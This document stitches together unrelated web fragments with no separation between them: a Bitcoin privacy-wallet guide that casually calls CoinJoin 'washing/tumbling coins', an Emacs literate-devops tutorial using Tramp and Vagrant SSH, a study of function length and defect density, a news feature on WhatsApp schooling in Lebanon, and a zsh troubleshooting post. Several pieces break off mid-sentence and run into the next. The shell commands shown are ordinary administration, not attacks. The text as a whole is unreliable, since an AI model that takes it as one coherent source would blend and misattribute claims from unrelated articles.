is a privacy focused wallet, that <em>automagically</em> sets up Tor for you, for network anonymity and provides an easy to use interface for <strong>CoinJoins</strong> (for cleaning/washing/tumbling coins). Some other features you might like:</p><ul><li>Lightning network support</li><li>Bech32 addresses</li><li>sendtomany (multiple payment outputs)</li><li>Labeling your transactions</li><li>Fee controls</li></ul><p>And many more…</p><h3 id="recommendations">Recommendations <a arial-abel="header-anchor" href="#recommendations">#</a></h3><ul><li><a href="https://electrum.org/" rel="noopener noreferrer" target="_blank">Electrum</a>
, you should use a self-hosted server, such as <a href="https://github.com/chris-belcher/electrum-personal-server" rel="noopener noreferrer" target="_blank">EPS</a></li><li><a href="https://wasabiwallet.io/" rel="noopener noreferrer" target="_blank">Wasabi</a></li><li><a href="https://phoenix.acinq.co/" rel="noopener noreferrer" target="_blank">Pheonix</a>

(Lightning wallet)</li></ul><blockquote><p>I will preface this by saying, that the following process is detailed and is not necessarily required, but I prefer to do things this way for more flexibility. If you are holding your funds in an exchange right now, simply downloading a <code>non-custodial</code>, generally accepted to be good wallet is already a massive improvement. The following steps are <strong>not</strong> required to hodl your <code>btc</code>. There are very simple to use wallets, such as <a href="https://phoenix.acinq.co/" rel="noopener noreferrer" target="_blank">Pheonix</a>
.

((tl;dr See <a href="https://www.youtube.com/watch?v=dljNabciEGg">my video presentation/demonstration</a> of this essay))
</p>

<p>
Maintaining servers falls into two phases:
</p>

<ol>
<li>Bang head until server works</li>
<li>Capture effort into some automation tool like Puppet or Chef.</li>
</ol>

<p>
Recently, I’ve been playing around with making the first phase closer
to the second.  For lack of a better word, I’m calling it <i>literate
devops</i>.
</p>

<p>
I’ve talked about using <a href="http://www.howardism.org/Technical/LP/introduction.html">org-mode’s <i>literate programming</i> model</a> to
investigate new ideas and crystallize thoughts, and this approach
appears to work well for me since I lack those esoteric sysadmin
skills.
</p>

<div id="outline-container-orgbcbce75">
<h2 id="orgbcbce75">Tell us a Story</h2>
<div id="text-orgbcbce75">
<p>
Once upon a time, I was tasked with patching an RPM, which is not in
my comfort zone, so my initial plan of attack was:
</p>

<ol>
<li>Use Vagrant to create a disposable CentOS system</li>
<li>SSH into this virtual machine to download needed tools</li>
<li>Run various unknown commands</li>
<li>Rinse and repeat this step until successful</li>
</ol>

<p>
Of course, once I figure out the solution, I need to document it for
others on my team, and maybe create a <i>repeatedable</i> script.
</p>

<p>
First step is well documented elsewhere, but today I learned (TIL)
you can <code>ssh</code> directly to your Vagrant-based virtual machine with
this little magic (<b>Note:</b> <i>client</i> is the name of my virtual
machine I specified in the <code>Vagrantfile</code>):
</p>

<div>
<pre>vagrant ssh-config --host clientvm &gt;&gt; $<span>HOME</span>/.ssh/config
</pre>
</div>

<p>
This command appends some lovely host-connection magic so you can
issue: <code>ssh clientvm</code>
</p>
</div>
</div>

<div id="outline-container-org8dff3db">
<h2 id="org8dff3db">Literate Devops</h2>
<div id="text-org8dff3db">
<p>
Instead of opening up a terminal to my virtual machine, I pop into
Emacs and load this sprint’s <i>note file</i><sup><a id="fnr.1" href="#fn.1">1</a></sup>, create a new header,
and enter the shell and ruby commands in this text file.
</p>

<p>
What good is this? Unlike a traditional terminal, this allows me to
<i>log</i>, <i>document</i> and <i>execute</i> each command.
</p>

<p>
For instance, here is a screen-shot of a section of my Emacs buffer:
</p>


<figure>
<img src="http://www.howardism.org/Technical/Emacs/literate-devops.png" alt="literate-devops.png">

</figure>

<p>
As an old bear with very little brains, my prose can explain the
background and purpose of each command.  Clicking the hyperlink
refreshes my memory of previous discoveries. A keychord <i>executes</i>
the code block…
</p>

<p>
Yes. I execute the commands from within Emacs.
</p>

<p>
Hitting <code>C-c C-c</code> (Control-C twice) runs the code (based on the
language).  This example runs in the shell. The results are placed
back into the file, which can be used by other code blocks (and <a href="http://orgmode.org/manual/results.html#results">many
other options</a>).
</p>

<p>
For instance, here is the first half of a section for downloading
the GPG Keys from a repository (the URL is placed in a <i>property</i>
that is shared among all code blocks in his section):
</p>


<figure>
<img src="http://www.howardism.org/Technical/Emacs/literate-devops-14.png" alt="literate-devops-14.png">

</figure>

<p>
The Shell script block (in the center of the screen-shot) uses
<code>wget</code> to download the HTML index file and parse and extract the key
file URLs.  We’ll have a Ruby script do that parsing, and since the
script may be a bit hairy, we’ll define it in another code block.
</p>

<p>
One technique from <a href="http://www.howardism.org/Technical/LP/introduction.html">literate programming</a> is the idea that one code
block can be inserted into another block (the reference is a name
within double angle brackets, <code>&lt;&lt;...&gt;&gt;</code>). Donald Knuth called this
feature WEB. Since it can accidentally conflict with some languages
(like Ruby), I have it off by default, but turn it on for this block
with the <code>noweb</code> parameter.
</p>

<p>
Here is the Ruby script. Having it in a separate Ruby-specific code
block allows me to turn on all the Ruby magic that Emacs can muster.
</p>


<figure>
<img src="http://www.howardism.org/Technical/Emacs/literate-devops-15.png" alt="literate-devops-15.png">

</figure>

<p>
The last step is to take the URLs produced by the first script and
feed them to another Shell script that will call <code>wget</code> to download
each:
</p>


<figure>
<img src="http://www.howardism.org/Technical/Emacs/literate-devops-16.png" alt="literate-devops-16.png">

</figure>

<p>
The <code>key-list</code> was the name of our original code block, as well as
the name of its results. We assign that list of results to a
variable, <code>LIST</code> that the shell script would access as <code>$LIST</code>.
</p>

<p>
This example demonstrated how literate programming can weave code
and data through different languages.
</p>

<div id="outline-container-org5d7bdd1">
<h2 id="org5d7bdd1">What about the Virtual Machine?</h2>
<p>
Normally, specifying <code>sh</code> as the code block’s <i>language</i>, tells
Emacs to run the code in my local system’s shell, but in this case,
I want it ran on my virtual machine (or on my development server in
my lab). I’ll describe two options for doing this, using <a href="http://www.emacswiki.org/TrampMode">Tramp</a> and
Babel Sessions.
</p>

<div id="outline-container-org2251b72">
<h3 id="org2251b72">Tramp to the Rescue</h3>
<div id="text-org2251b72">
<p>
Tramp is an Emacs feature that allows one to edit a file on a
remote machine using <code>ssh</code> and other protocols. For instance,
running the <code>find-file</code> function (bound to <code>C-x C-f</code>) lets you type
something like:
</p>

<pre>/ssh:howard.abrams@goblin.howardism.org:web/files/robot.txt
</pre>

<p>
If you put the following in your <code>.emacs</code> initialization file:
</p>

<div>
<pre><span>(</span><span>setq</span> tramp-default-method <span>"ssh"</span><span>)</span>
</pre>
</div>

<p>
And update your <code>~/.ssh/config</code> file to know what user account goes
with the host name, the file reference above can be shorten to:
</p>

<pre>/goblin.howardism.org:web/files/robot.txt
</pre>

<p>
Emacs looks for the <code>:</code> character to determine if Tramp should be
invoked.  Tramp uses SSH keys if available, or will prompt you for
a password if needed.
</p>


<p>
Each org-mode code block can specify a <code>:dir</code> option that specifies
where the code snippet should run, for instance, the following
blocks are equivalent:
</p>


<figure>
<img src="http://www.howardism.org/Technical/Emacs/literate-devops-9.png" alt="literate-devops-9.png">

</figure>

<p>
The <code>:dir</code> option allows full Tramp functionality, allowing me to
run a block on a different machine. Remember how I added my
<code>client</code> Vagrant virtual machine to my <code>~/.ssh/config</code> file?
</p>


<figure>
<img src="http://www.howardism.org/Technical/Emacs/literate-devops-10.png" alt="literate-devops-10.png">

</figure>

<p>
<i>But I need access to my machine behind a firewall!?</i>
</p>

<p>
My job deals with virtual machines running in a highly protected
data center, where I need to first log into jump boxes and bastion
machines. Tramp handles these sorts of hops. For instance:
</p>

<pre>/ssh:10.98.18.229|ssh:10.0.1.122|sudo:/etc/network/interfaces
</pre>

<p>
Uses my account name to log into the bastion machine, and
then uses my account name to <code>ssh</code> into a virtual machine running
in a private cloud. And then uses the <code>sudo</code> command to let me edit
a file owned by <code>root</code>.
</p>

<p>
Tramp pipe references works with the <code>:dir</code> option for <code>org-mode</code>
source blocks:
</p>


<figure>
<img src="http://www.howardism.org/Technical/Emacs/literate-devops-11.png" alt="literate-devops-11.png">

</figure>

<p>
Few tricks to keep in mind:
</p>

<ul>
<li>All but the last hop uses a pipe character, |, instead of the
colon character, :</li>
<li>If you use the pipe character, you need to specify all
protocols, like <code>ssh</code>, even if it is the default.</li>
<li>If your local machine’s operating system is different than the
machine you are connecting to, you need to fix a bug in
<code>org-mode</code>, which I can show you how to fix<sup><a id="fnr.2" href="#fn.2">2</a></sup>.</li>
</ul>
</div>
</div>

<div id="outline-container-org0d027af">
<h3 id="org0d027af">Using org-mode Sessions</h3>
<div id="text-org0d027af">
<p>
Another approach is to create a <i>session</i> that connects different
code blocks together. Each screen shot below, each code block below
has the same <code>session</code> value, <code>client</code> (which is conveniently the
same my virtual machine’s hostname, <code>client</code>):
</p>


<figure>
<img src="http://www.howardism.org/Technical/Emacs/literate-devops-2b.png" alt="literate-devops-2b.png">

</figure>

<p>
If I execute the first block, a <i>shell</i> is started in the
background, and it ssh’s into the machine. Note, to get this
working, you need to enable <i>password-less access</i> by placing your
SSH’s public key into the remote system’s <code>.ssh/authorized_keys</code>
file, or using the <code>ssh</code> Emacs package.<sup><a id="fnr.3" href="#fn.3">3</a></sup>
</p>

<p>
From this point on, each code block I execute with the <code>client</code>
session value, uses this connection, and the code is executed on the
remote machine (a virtual machine in this case, but that doesn’t
matter).
</p>

<p>
Either of these approaches works well, but the second approach,
allows me to set variables to create a particular state that other
blocks may expect.  However, this requires execution of each block in
order.
</p>

<p>
I have a third, more interactive, approach<sup><a id="fnr.4" href="#fn.4">4</a></sup> using <code>screen</code>, but
it doesn’t allow passing variables to the code, and as you’ll see
below, this is pretty important to me.
</p>


<p>
Regardless, I continue learning how to accomplish my goal, all the
while documenting and <i>validating</i> my steps. The end result can be
exported to web or wiki page.

<div id="outline-container-org39ccdca">
<h2 id="org39ccdca">What about Verbose Commands?</h2>
<div id="text-org39ccdca">
<p>
Yes, executing some commands can be quite time-consuming and
verbose, but often I need to search the results, and having the
results placed in an Emacs buffer allows better searching.
</p>

<p>
Often I use a collapsible “drawer” (which is just a way to identify
the beginning and end of the output):
</p>


<figure>
<img src="http://www.howardism.org/Technical/Emacs/literate-devops-3.png" alt="literate-devops-3.png">

</figure>

<p>
Place the cursor on this drawer and hit the <code>Tab</code> key to hide or
show the output:

<div id="outline-container-org3721d6c">
<h2 id="org3721d6c">Can you Use the Output?</h2>
<div id="text-org3721d6c">
<p>
The results of some commands are often needed for the next command,
and I’m sure you just love using your mouse to copy and paste part
of the output, but I have a better way.
</p>

<p>
For instance, I needed a list of an RPM’s dependencies:
</p>


<figure>
<img src="http://www.howardism.org/Technical/Emacs/literate-devops-5.png" alt="literate-devops-5.png">

</figure>

<p>
Notice I <i>named</i> this source code block. Also notice how Emacs
automatically broke the results up into a table. By default, the

The following source block creates a variable named <code>DEPENDS</code> that
uses rows 2 through 10 of the first column as an array.

<p>This is the first part of a blog series where I examine programming concepts from a scientific perspective. In this part I dig up every study relating to function length I could find, fill in some gaps with original research, and examine what we can learn.</p>



<p>Highlights:</p>



<ul id="block-f6ddbfdc-f37f-48df-8d67-6990d4b79de3"><li>We find that in older studies (pre-2000) short functions correlate with higher defect density</li><li>There seem to be no post-2000 studies exclusively focusing on function length, but through original research we find that modern code bases exhibit similar behavior</li><li>We also find that in empirical experiments short functions make code slower to debug, with some weaker evidence suggesting they also make it slower for adding new features but faster to modify</li></ul>



<p><strong>Introduction</strong></p>



<p>In programming lore it’s hard to find sources glorifying long functions. This is codified, for example, in the widely quoted book ‘Clean Code’ which states:</p>



<blockquote><p>The first rule of functions is that they should be small. The second rule of functions is that they should be smaller than that. Functions should not be 100 lines long. Functions should hardly ever be 20 lines long</p></blockquote>



<p>Favoring short functions isn’t by any means a new practise – a 1986 study “An Empirical Study of Software Design Practices” states “keeping modules small” as a good design practise. They also quote a book from 1974, stating “many programming standards limit module size to one page (or 50-60 source lines of code)”.</p>



<p><strong>What is a small function?</strong></p>



<p>What was meant by shorts functions in the 80s is different from small functions of today. In a study from 1991 ([1]) the line between small and large functions is drawn at 142 lines, staggeringly long by modern standards. In the same vein, a study from 1984 groups functions into buckets by increments of 50 lines ([2]).</p>



<p>However, nowadays the vast majority of functions are under 50 lines. A quick analysis of Eclipse, a popular open source IDE, reveals it averages about 8.6 lines per method in its source code. Above mentioned book “Clean Code”, published in 2008, states that functions should rarely be more than 20 lines, and the author has stated in other contexts he often prefers to use single-line functions, and that about half of the functions written by the author in Ruby are single-liners.</p>



<p>This shift in function sizes is perhaps partially due to changes in programming languages. In the 80s a Fortran “module” was commonly considered a function and some variables&nbsp; (see eg. <a href="https://www.tutorialspoint.com/fortran/fortran_modules.htm">https://www.tutorialspoint.com/fortran/fortran_modules.htm</a>) and function was the basic building block of software, whereas nowadays most Java or C++ programmers would define “module” as a class consisting of multiple functions.</p>



<p>Many studies focus on analyzing module sizes without specifying what a module is, so I’ve only included studies which specifically state they analyze functions. This, combined with the change in what we consider a basic building block of software, combined with the historical shift in function sizes, makes it hard to properly analyze and aggregate the studies, but we can certainly try.</p>



<p><strong>Function length and defect density – pre-2000</strong></p>



<p>The first studies concerning the length of functions I could find were from the early 80s. Nowadays most studies examine the code on a class and package level, whereas in the 80s object oriented programming was still quite rare and functions were the main building blocks of software, so it made a lot of sense to examine functions and their error proneness.</p>



<p>The early research on function length and defect density found that very small functions tended to have higher defect densities. This has been cited in “Code Complete”, where Steve McConnell says: “The routine should be allowed to grow organically up to 100-200 lines, decades of evidence say that routines of such length no more error prone then shorter routines.” Further, he gives a reference to a study that says routines 65 lines or longer are cheaper to develop. (see appendix for a more extensive take on the studies used in Code Complete)</p>



<p>To dive further, a study from 1984 ([2]) grouped function to buckets with increments of 50 lines and measured the error density for each bucket. They found that smaller functions contained, on average, more defects per line:</p>

<p>A follow-up study ([3]) examined five Fortran projects, and states that “no significant relationship was found between module size and fault rate“ even though, in the same paragraph, the authors also state that “nevertheless, [small modules] exhibited the highest average fault rate because a small module with even a single fault will show a very high fault rate“. It’s not clear why the authors state that module size and fault rate has no significant relationship and then state that average fault rate is highest for small modules. Another conclusion from [3] is that larger functions are cheaper to develop.</p>



<p>A third empirical study ([1]) analyzed 450 routines and found that “small” routines (those with fewer than 143 source statements, including comments) had 23 percent more errors per line of code than larger routines but were 2.4 times less expensive to fix than larger routines. This is interesting since it contrasts with some other experimental results we’ll see later.</p>



<p>So far it appears short functions are correlated with higher defect density, but due to the large sizes of the examined functions you’d be forgiven for doubting the relevance of these studies to modern software engineering.</p>



<p><strong>Modern defect prediction literature</strong></p>



<p>Modern defect prediction approaches are characterized by large data sets and machine learning methods applied on them. They mainly concentrate on correlating features such as “average method length” and “lines of code” with defects in an attempt to create defect prediction models.</p>



<p>Several such studies have found a correlation between size of methods and defects. For example [4] found that the size of the longest method in a class correlates positively with post-relase defects. Does this mean we should refactor our long methods into short ones to avoid defects?</p>

<p>Turns out the answer is no. In those same studies, the number of methods also correlates with defects:</p>







<div><figure><img loading="lazy" src="https://i0.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-22-at-4.01.53-PM.png?resize=640%2C61&amp;ssl=1" alt="" width="640" height="61" srcset="https://i0.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-22-at-4.01.53-PM.png?resize=1024%2C98&amp;ssl=1 1024w, https://i0.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-22-at-4.01.53-PM.png?resize=300%2C29&amp;ssl=1 300w, https://i0.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-22-at-4.01.53-PM.png?resize=768%2C73&amp;ssl=1 768w, https://i0.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-22-at-4.01.53-PM.png?resize=1536%2C146&amp;ssl=1 1536w, https://i0.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-22-at-4.01.53-PM.png?resize=2048%2C195&amp;ssl=1 2048w, https://i0.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-22-at-4.01.53-PM.png?resize=1568%2C149&amp;ssl=1 1568w, https://i0.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-22-at-4.01.53-PM.png?w=1280&amp;ssl=1 1280w, https://i0.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-22-at-4.01.53-PM.png?w=1920&amp;ssl=1 1920w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1"><figcaption>The number of functions in a class also correlates with defects. [4]</figcaption></figure></div>



<p>To put it plainly, if we have a long function and split it into smaller ones, we’re not removing a source of defects, but we would simply be switching from one to another.</p>



<p>The same effect can be seen in other defect prediction studies. For example in [5] we see that both “Weighted Methods per Class” and “Average Method Complexity” correlate with defects, where former is defined as “number of methods in the class” and latter as “the average method size for each class“.</p>



<p>In both studies both metrics have a statistically significant correlation with defects, and this appears to be the trend across many other studies in defect prediction literature.</p>



<p>The literature doesn’t provide a straightforward way to measure which feature (length or number of methods) is more significant when predicting defects. It’s quite possible that, for example, measures such as “average method complexity” and “number of methods in a class” simply act as 2nd order estimators for number of lines, in which case we’d simply be comparing which measure correlates better with the underlying metric.</p>



<p>In addition, we’re interested in examining the length of the functions on a more granular level. Finding out that the number of methods and the length of methods both correlate with defects doesn’t give us anything tangible, and doing this sort of class or module level correlation analysis doesn’t get us very far.</p>



<p>However, the datasets used in many of these studies are open and we can download them to try to examine the relationship between functions length and defects ourselves.</p>



<p><strong>Data set analysis</strong></p>



<p>Time to scare the wikipedia editors among you and do some original research. All the code and data can be found at <a href="https://github.com/softwarebyscience/function-length/">https://github.com/softwarebyscience/function-length/</a>.</p>



<p>I took two datasets which contained the features we are interested in, such as the number of methods and lines of code per class. The first dataset I worked with is simply called “Eclipse Bug Database” and it contained data from three major Eclipse releases ([7]).</p>



<p>In addition, I used the “Bug Prediction Dataset” from <a href="http://bug.inf.usi.ch/download.php">http://bug.inf.usi.ch/download.php</a> as it seemed larger than the Eclipse Bug Database. The data is collected between 2005 and 2009 from 5 different Java projects – for a more detailed explanation see [6].</p>



<p>The results from the first dataset are quite straightforward:</p>



<div><figure><img loading="lazy" src="https://i2.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-24-at-9.13.53-PM.png?resize=511%2C375&amp;ssl=1" alt="" width="511" height="375" srcset="https://i2.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-24-at-9.13.53-PM.png?resize=1024%2C752&amp;ssl=1 1024w, https://i2.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-24-at-9.13.53-PM.png?resize=300%2C220&amp;ssl=1 300w, https://i2.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-24-at-9.13.53-PM.png?resize=768%2C564&amp;ssl=1 768w, https://i2.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-24-at-9.13.53-PM.png?w=1174&amp;ssl=1 1174w" sizes="(max-width: 511px) 100vw, 511px" data-recalc-dims="1"></figure></div>



<p>Here smaller methods clearly have a higher defect density, with the minimum defect density roughly found in classes where the methods average around 10-15 lines. What’s perhaps hard to see from the chart is that defect density starts very slightly increasing towards the right.</p>



<p>The results from the second dataset are a bit more interesting (moving average in red):</p>



<div><figure><img loading="lazy" src="https://i1.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-24-at-9.15.45-PM.png?resize=502%2C367&amp;ssl=1" alt="" width="502" height="367" srcset="https://i1.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-24-at-9.15.45-PM.png?resize=1024%2C750&amp;ssl=1 1024w, https://i1.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-24-at-9.15.45-PM.png?resize=300%2C220&amp;ssl=1 300w, https://i1.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-24-at-9.15.45-PM.png?resize=768%2C563&amp;ssl=1 768w, https://i1.wp.com/softwarebyscience.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-24-at-9.15.45-PM.png?w=1168&amp;ssl=1 1168w" sizes="(max-width: 502px) 100vw, 502px" data-recalc-dims="1"></figure></div>



<p>Perhaps most surprisingly, the distribution is quite different compared to the first dataset, even though I would’ve expected the distributions to look very similar. I have no good theories as to why this might be the case (apart from a bug in my code, although I did check it several times).</p>



<p>There are a few other interesting details here. The average error density in the second dataset is higher, and this is likely because we consider all bugs over the ~4 year period, whereas the first dataset only considers the last 6 months and specific type of bugs (see [6] and [7] for details). In addition there are some zero-length functions. These are likely methods of abstract classes, meant to be overwritten. When analyzing post-release defects we see a roughly similar picture, if noisier (graph can be found in …</p></div></div>

August 29, 2020 | https://restofworld.org/2020/lebanon-schools-whatsapp-group/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/lebanon-schools-whatsapp-group/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>When 27-year-old Lebanese teacher Sara Mazbouh heard news of the Covid-19 stay-at-home order, her mind went straight to her students. Mazbouh, who has been teaching for nine years at a school in the suburbs of Beirut, wondered how they would cope. After the <a href="https://www.reuters.com/article/us-lebanon-protests/protesters-block-roads-in-beirut-other-parts-of-lebanon-idUSKBN1XE0H7">nationwide protests</a> and shutdowns across Lebanon in October of last year, the day-to-day lives of her students would again be paralyzed by circumstances out of their control.</p>



<p>In the early weeks of the shutdown, Mazbouh and her colleagues photocopied their lessons, leaving them for parents to pick up at school. Then, <a href="https://en.unesco.org/covid19/educationresponse">like countless others around the world</a>, Mazbouh’s campus announced it would be closing for the rest of the year. Most of her students are firmly middle-class; she knew many parents wouldn’t be able to afford online learning — steady internet and a computer at home <a href="https://www.dw.com/en/lebanon-telecommunication-in-government-hands/a-48634796#:~:text=But%20this%20progress%20does%20not,that%20is%20on%20the%20rise.">aren’t a given</a>.&nbsp;</p>



<p>Exasperated, Mazbouh messaged her fellow teachers on WhatsApp. A distance-learning solution, they soon realized, was right in front of them.</p>



<p>In Lebanon, where schools have been closed for over five months, WhatsApp has become an informal distance-learning app for students and teachers. The app allows educators to share their lessons using voice notes, videos, and photos in group chats that mimic a classroom structure.&nbsp;</p>

</p><figcaption>Six-year-old Omar Jamal sings a springtime nursery rhyme for Lebanese Mother’s Day in his backyard.</figcaption></figure>



<p>Lebanon’s ongoing financial crisis has made it harder and harder for families to afford their phone bills. In the wake of the massive explosion that rocked the country’s capital in early August, more than 300,000 Beirutis, up to <a href="https://www.voanews.com/middle-east/unicef-says-beirut-children-will-need-special-care-after-blast">one-third of them school-age children</a>, have been displaced from their homes. In spite of the odds, teachers and parents are embracing creative ways to keep their “WhatsApp schools” in session.</p>



<p>For Mazbouh and her fellow teachers, shifting classes to WhatsApp was a matter of necessity. “The school administration didn’t even ask us to pursue WhatsApp teaching as a solution,” she says. “But the kids shouldn’t have to waste their year.” The teachers at Mazbouh’s school had such success with their ad hoc WhatsApp classroom that the administrators organized similar group chats for their elementary school counterparts.</p>



<p>As teachers across the country bring their classrooms to WhatsApp, they have realized there are new students in their classrooms: parents. For younger students, the adults play videos, record their kids completing assignments, and send the footage to teachers, who monitor their progress. Kindergarten teacher Noura Chehayeb shares snippets of her students’ reading progress on Facebook along with encouraging messages for their parents, whom she tags in different posts. The clips offer glimpses into each household’s unique effort to maintain normalcy during the pandemic. In one, a mom films her child singing a nursery song in their backyard. In another, a girl practices her French spelling, while her father talks at a TV playing the nightly news in the background.</p>



<p>Even though it was never intended to be an educational tool, there are unique benefits to WhatsApp distance learning. Some of the higher-end platforms used for distance learning require technical skills and hardware, such as laptops, that not all families possess. WhatsApp requires only a smartphone.&nbsp;</p>



<figure><p>
<iframe data-src="https://player.vimeo.com/video/451211974?dnt=1&amp;app_id=122963" width="234" height="426" allow="autoplay; fullscreen" allowfullscreen=""></iframe>
</p><figcaption>Five-year-old Nourhane learns ocean vocabulary. She says she has fun getting filmed and likes to share her homework with her friends.</figcaption></figure>



<p>The app’s “read receipts” function as an unofficial monitoring tool for teachers tracking their students’ participation. Once a student opens a group chat, all texts and photos appear as “seen” from the teacher’s perspective. Antoine Gebian, a 41-year-old private-school teacher, realized WhatsApp treated audio messages a little differently: his students must open each clip to indicate a “played” receipt; he could check if they hadn’t listened to his voice notes. Gebian used the function as a sort of attendance tally for his WhatsApp classroom. While Lebanon’s school curricula are offered in French and English, many parents speak only Arabic fluently. WhatsApp’s voice notes allow Lebanese teachers to switch between the three with ease.&nbsp;</p>



<p>But distance learning, even when held exclusively on WhatsApp, may be out of reach for Lebanon’s students this fall.</p>



<p>The effects of this month’s blast are far-reaching: the nearly 2,700-ton explosion obliterated Beirut’s port, Lebanon’s biggest and its main source for imports that sustain the country. The economic impact will go beyond the city itself. “Many parents are saying they can’t enroll their kids for economic and Covid reasons,” says Mazbouh, who was laid off from her job of nearly a decade in July. “The percentage of parents who are actually enrolling their kids is very low, and if they are, they’re not paying their fees.” Mazbouh’s school closed the same week she lost her job, its principal dismissed along with all the other teachers. Mazbouh says she doesn’t blame the school for the closure. “Our economic situation is very hard,” she says. “They have every right to shut down.”&nbsp;</p>



<figure><blockquote><p>“It’s much easier for children to grasp things if they live in a physical space that portrays it.”&nbsp;</p></blockquote></figure>



<p>That was before <a href="https://www.nytimes.com/interactive/2020/08/04/world/middleeast/beirut-explosion-damage.html">the August 4 blast</a>. Initial reports indicate that more than <a href="https://www.voanews.com/middle-east/unicef-says-beirut-children-will-need-special-care-after-blast">120 schools were damaged by the explosion</a>, leaving some 55,000 students without physical classrooms. Lebanese authorities say they plan to host displaced families in those that haven’t been damaged. Together with the pandemic, it makes a return to the classroom this fall unlikely<strong> </strong>for many students in Lebanon. For those schools that do try to stay in session, WhatsApp may be a solution to the myriad challenges they face.&nbsp;</p>



<p>Carla Najem, a psychologist at the American University of Beirut Medical Center, says prolonged time out of the classroom may have serious repercussions for Lebanese students. “Our basic needs are not being met right now,” says Najem. “[Students] are going through a lot mentally and emotionally.”</p>



<p>Even as conditions in an ailing Lebanon deteriorate, Najem says that certain aspects of distance learning, like sharing photos and videos, can ameliorate some of the long-term negative effects. “It’s much easier for children to grasp things if they live in a physical space that portrays it,” Najem says. “Maybe we need to use those things as an opportunity to help children connect.”&nbsp;</p>



<p>Najem says we have a lot to learn from students, even as they face a daunting new school year. “Children are very resilient,” she explains. “They adapt much quicker than adults.”</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>I wanted to install the latest version of zsh on my MacBook Pro. This is
usually the first thing I install when setting up a new machine. A <code>brew
install zsh</code> and a <code>chsh</code> later and I'm good to go (well, technically I had to
add the homebrew location of zsh to <code>/etc/shells</code> as well). Close out
Terminal.app and reopen to make sure my changes took effect, and sure enough,
there's my zsh prompt. </p>
<p>Yes, I know macOS Catalina ships with zsh as the default shell, but I want to
make sure I have the latest... just because.</p>
<p>Curiosity strikes in and I wonder, even though the homebrew location of zsh is
configured as my shell, am I actually using it?</p>
<h2>which</h2>
<div><pre><span></span><span>~ % which zsh</span>
<span>/usr/local/bin/zsh</span>
</pre></div>


<p>Hold on. I want the full location.</p>
<div><pre><span></span><span>~ % ls -la $(which zsh)</span>
<span>lrwxr-xr-x  1 wally  admin  27 Dec 28 20:28 /usr/local/bin/zsh -&gt; ../Cellar/zsh/5.7.1/bin/zsh</span>
</pre></div>


<p>Yup, that looks about right. </p>
<p>But wait... that only told me the location of zsh the executable which is only
correct because I added homebrew's <code>/usr/local/bin</code> location to my <code>PATH</code>. That is literally
the first line of the man page for <code>which</code>.</p>
<div><pre><span></span><span>WHICH</span><span>(</span><span>1</span><span>)</span>                  <span>BSD</span> <span>General</span> <span>Commands</span> <span>Manual</span>                 <span>WHICH</span><span>(</span><span>1</span><span>)</span>

<span>NAME</span>
     <span>which</span> <span>-- locate a program file in the user's path</span>
</pre></div>


<p>That means that if I were to execute <code>zsh</code> from my current shell a new instance
of zsh from <code>/usr/local/bin/zsh</code> would begin. This doesn't tell me the location
of the shell I'm currently typing in which started after opening Terminal.app.</p>
<h2>$SHELL</h2>
<div><pre><span></span><span>~ % echo $SHELL</span>
<span>/usr/local/bin/zsh</span>
</pre></div>


<p>Eh, I don't know. That tells me that it's configured as my shell but does not
necessarily tell me the location of the shell I'm currently typing in.</p>
<h2>ps</h2>
<p>Maybe I can find the currently running process of the instance of zsh I'm in right now.</p>
<div><pre><span></span><span>~ % ps </span>
<span>  PID TTY           TIME CMD</span>
<span>78525 ttys003    0:00.11 -zsh</span>
</pre></div>


<p>Well that still doesn't give me the full path. And is that even the right
process? How do I get the PID of the shell I'm currently typing in? Turns out
there's a convenient shell variable <code>$$</code>.</p>



<p>Hmm, that's good I suppose, but I still don't know if the process with PID
<code>78525</code>, the one I'm currently typing in, is the correct zsh.</p>
<h2>lsof</h2>
<p>Oh yeah, I probably should have used <code>lsof</code> a long time ago but knowing how to
get the PID of the current shell makes things a bit easier.</p>
<div><pre><span></span><span>~</span> <span>%</span> <span>lsof</span> <span>-</span><span>p</span> <span>$$</span>
<span>COMMAND</span>   <span>PID</span>  <span>USER</span>   <span>FD</span>   <span>TYPE</span> <span>DEVICE</span> <span>SIZE</span><span>/</span><span>OFF</span>                <span>NODE</span> <span>NAME</span>
<span>zsh</span>     <span>78525</span> <span>wally</span>  <span>cwd</span>    <span>DIR</span>    <span>1</span><span>,</span><span>5</span>     <span>1120</span>              <span>362897</span> <span>/</span><span>Users</span><span>/</span><span>wally</span>
<span>zsh</span>     <span>78525</span> <span>wally</span>  <span>txt</span>    <span>REG</span>    <span>1</span><span>,</span><span>5</span>   <span>614404</span>             <span>1052389</span> <span>/</span><span>usr</span><span>/</span><span>local</span><span>/</span><span>Cellar</span><span>/</span><span>zsh</span><span>/</span><span>5</span><span>.</span><span>7</span><span>.</span><span>1</span><span>/</span><span>bin</span><span>/</span><span>zsh</span>

